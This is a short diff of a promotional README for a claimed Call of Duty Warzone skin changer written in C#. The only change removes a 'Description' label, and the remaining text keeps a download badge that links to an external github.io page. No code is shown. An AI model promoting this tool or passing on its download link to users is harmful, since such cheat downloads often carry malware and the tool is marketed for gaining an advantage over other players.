@@ -1,6 +1,5 @@
 # C# Call of Duty Warzone SkinChanger 🎮✨  
 
-**Description:**  
 A cutting-edge C# tool designed to revolutionize your Call of Duty Warzone experience. Customize skins, emblems, and in-game effects with ease. Perfect for boosting DMZ mode performance, unlocking hidden cosmetics, and staying ahead of the competition. Built for speed and stability, this tool ensures seamless integration with Warzone’s latest updates.  
 
 [![Download SkinChanger](https://img.shields.io/badge/Download-SkinChanger-blueviolet)](https://cod-skinchanger-skinswapper.github.io/.github/)  
